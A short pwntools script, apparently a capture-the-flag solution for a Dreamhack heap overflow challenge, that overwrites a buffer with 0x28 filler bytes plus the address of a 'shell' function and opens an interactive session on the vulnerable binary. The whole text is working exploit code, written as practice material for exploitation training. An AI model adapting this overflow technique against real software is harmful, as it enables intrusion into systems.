from pwn import *

#p = remote('host3.dreamhack.games', '14947')
p = process('./basic_heap_overflow')

shell = 0x804867b
payload = b"A"*0x28 + p32(shell)

p.send(payload)
p.interactive()